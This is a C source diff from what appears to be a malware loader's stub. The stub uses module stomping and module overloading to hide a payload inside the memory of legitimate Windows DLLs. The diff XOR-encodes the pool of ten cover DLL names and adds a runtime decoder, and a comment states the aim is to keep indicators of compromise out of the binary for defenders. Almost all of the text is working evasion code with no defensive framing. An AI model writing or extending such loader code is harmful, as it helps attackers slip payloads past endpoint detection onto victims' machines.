@@ -15,21 +15,36 @@ typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, U
 typedef LPVOID   (WINAPI *pfnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL     (WINAPI *pfnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
 
-/* 10-DLL lookup table — indices match the layout documented in ModuleStomping.h.
- * Builder stores 3 chosen indices in .rsrc; Stub resolves names here at runtime.
- * No DLL name appears in the .rsrc payload — only 3 opaque bytes. */
-const wchar_t* g_DllPool[10] = {
-    L"xpsservices.dll",  /* 0 — PRINT  */
-    L"msi.dll",          /* 1 — PRINT  */
-    L"dbghelp.dll",      /* 2 — PRINT  */
-    L"winmm.dll",        /* 3 — MEDIA  */
-    L"dxgi.dll",         /* 4 — MEDIA  */
-    L"oleaut32.dll",     /* 5 — MEDIA  */
-    L"winhttp.dll",      /* 6 — NETWORK */
-    L"wtsapi32.dll",     /* 7 — NETWORK */
-    L"wlanapi.dll",      /* 8 — NETWORK */
-    L"bcrypt.dll",       /* 9 — CRYPTO  */
+/* 10-DLL lookup table — XOR-encoded (key 0x5A) to avoid plaintext wide-string
+ * IOCs in .rdata.  Builder stores 3 chosen indices in .rsrc; Stub decodes
+ * names on demand via DecodeDllName().  No DLL name in .rsrc — only 3 bytes. */
+#define DLL_XOR_KEY 0x5Au
+
+/* Each array holds the XOR-encoded ASCII bytes of the DLL name (no null terminator). */
+static const BYTE k_dll_0[] = {0x22,0x2A,0x29,0x29,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x29,0x74,0x3E,0x36,0x36}; /* xpsservices.dll */
+static const BYTE k_dll_1[] = {0x37,0x29,0x33,0x74,0x3E,0x36,0x36};                                          /* msi.dll        */
+static const BYTE k_dll_2[] = {0x3E,0x38,0x3D,0x32,0x3F,0x36,0x2A,0x74,0x3E,0x36,0x36};                     /* dbghelp.dll    */
+static const BYTE k_dll_3[] = {0x2D,0x33,0x34,0x37,0x37,0x74,0x3E,0x36,0x36};                               /* winmm.dll      */
+static const BYTE k_dll_4[] = {0x3E,0x22,0x3D,0x33,0x74,0x3E,0x36,0x36};                                    /* dxgi.dll       */
+static const BYTE k_dll_5[] = {0x35,0x36,0x3F,0x3B,0x2F,0x2E,0x69,0x68,0x74,0x3E,0x36,0x36};               /* oleaut32.dll   */
+static const BYTE k_dll_6[] = {0x2D,0x33,0x34,0x32,0x2E,0x2E,0x2A,0x74,0x3E,0x36,0x36};                    /* winhttp.dll    */
+static const BYTE k_dll_7[] = {0x2D,0x2E,0x29,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36};               /* wtsapi32.dll   */
+static const BYTE k_dll_8[] = {0x2D,0x36,0x3B,0x34,0x3B,0x2A,0x33,0x74,0x3E,0x36,0x36};                    /* wlanapi.dll    */
+static const BYTE k_dll_9[] = {0x38,0x39,0x28,0x23,0x2A,0x2E,0x74,0x3E,0x36,0x36};                         /* bcrypt.dll     */
+
+static const BYTE* const k_dll_enc[] = {
+    k_dll_0, k_dll_1, k_dll_2, k_dll_3, k_dll_4,
+    k_dll_5, k_dll_6, k_dll_7, k_dll_8, k_dll_9
 };
+static const BYTE k_dll_len[] = { 15, 7, 11, 9, 8, 12, 11, 12, 11, 10 };
+
+static void DecodeDllName(BYTE idx, WCHAR* buf) {
+    if (idx >= 10) { buf[0] = L'\0'; return; }
+    const BYTE* src = k_dll_enc[idx];
+    int len = k_dll_len[idx];
+    for (int i = 0; i < len; i++) buf[i] = (WCHAR)(src[i] ^ DLL_XOR_KEY);
+    buf[len] = L'\0';
+}
 
 /* ModuleStomp_Alloc
  *
@@ -78,7 +93,9 @@ PVOID ModuleStomp_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
         BYTE idx = dll_indices[i];
         if (idx >= 10) continue;              /* guard against corrupt .rsrc */
 
-        HMODULE hModule = LoadLibraryW(g_DllPool[idx]);
+        WCHAR dllNameBuf[32];
+        DecodeDllName(idx, dllNameBuf);
+        HMODULE hModule = LoadLibraryW(dllNameBuf);
         if (!hModule) continue;
 
         PBYTE pBase = (PBYTE)hModule;
@@ -182,8 +199,9 @@ PVOID ModuleOverload_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
         int k = 0;
         for (; sysDir[k] && k < MAX_PATH - 2; k++) dllPath[k] = sysDir[k];
         dllPath[k++] = L'\\';
-        const wchar_t* name = g_DllPool[idx];
-        for (int m = 0; name[m] && k < MAX_PATH - 1; m++, k++) dllPath[k] = name[m];
+        WCHAR dllNameBuf[32];
+        DecodeDllName(idx, dllNameBuf);
+        for (int m = 0; dllNameBuf[m] && k < MAX_PATH - 1; m++, k++) dllPath[k] = dllNameBuf[m];
         dllPath[k] = L'\0';
 
         /* Open a read handle to the DLL file — needed for NtCreateSection(SEC_IMAGE) */
